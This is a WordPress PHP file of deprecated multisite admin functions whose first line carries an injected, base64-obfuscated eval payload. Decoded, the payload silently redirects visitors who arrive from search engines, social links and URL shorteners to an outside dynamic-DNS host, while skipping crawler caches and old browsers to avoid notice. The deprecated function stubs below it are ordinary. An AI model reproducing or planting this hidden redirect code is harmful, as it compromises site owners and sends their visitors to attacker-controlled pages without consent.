<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tL2wiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsKaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSBhbmQgIXN0cmlzdHIoJHJlZmVyZXIsIkVlWXAzRDciKSl7CmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9pcnhucmphdy5kZG5zLm1lLnVrLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * Deprecated multisite admin functions from past WordPress versions and WordPress MU.
 * You shouldn't use these functions and look for the alternatives instead. The functions
 * will be removed in a later version.
 *
 * @package WordPress
 * @subpackage Deprecated
 * @since 3.0.0
 */

/**
 * @deprecated 3.0.0
 */
function wpmu_menu() {
	_deprecated_function(__FUNCTION__, '3.0' );
	// deprecated. See #11763
}

/**
  * Determines if the available space defined by the admin has been exceeded by the user.
  *
  * @deprecated 3.0.0
  * @see is_upload_space_available()
 */
function wpmu_checkAvailableSpace() {
	_deprecated_function(__FUNCTION__, '3.0', 'is_upload_space_available()' );

	if ( !is_upload_space_available() )
		wp_die( __('Sorry, you must delete files before you can upload any more.') );
}

/**
 * @deprecated 3.0.0
 */
function mu_options( $options ) {
	_deprecated_function(__FUNCTION__, '3.0' );
	return $options;
}

/**
 * @deprecated 3.0.0
 * @see activate_plugin()
 */
function activate_sitewide_plugin() {
	_deprecated_function(__FUNCTION__, '3.0', 'activate_plugin()' );
	return false;
}

/**
 * @deprecated 3.0.0
 * @see deactivate_sitewide_plugin()
 */
function deactivate_sitewide_plugin( $plugin = false ) {
	_deprecated_function(__FUNCTION__, '3.0', 'deactivate_plugin()' );
	return;
}

/**
 * @deprecated 3.0.0
 * @see is_network_only_plugin()
 */
function is_wpmu_sitewide_plugin( $file ) {
	_deprecated_function(__FUNCTION__, '3.0', 'is_network_only_plugin()' );
	return is_network_only_plugin( $file );
}

function get_site_allowed_themes() {
	_deprecated_function( __FUNCTION__, '3.4', 'WP_Theme::get_allowed_on_network()' );
	return array_map( 'intval', WP_Theme::get_allowed_on_network() );
}

function wpmu_get_blog_allowedthemes( $blog_id = 0 ) {
	_deprecated_function( __FUNCTION__, '3.4', 'WP_Theme::get_allowed_on_site()' );
	return array_map( 'intval', WP_Theme::get_allowed_on_site( $blog_id ) );
}

function ms_deprecated_blogs_file() {}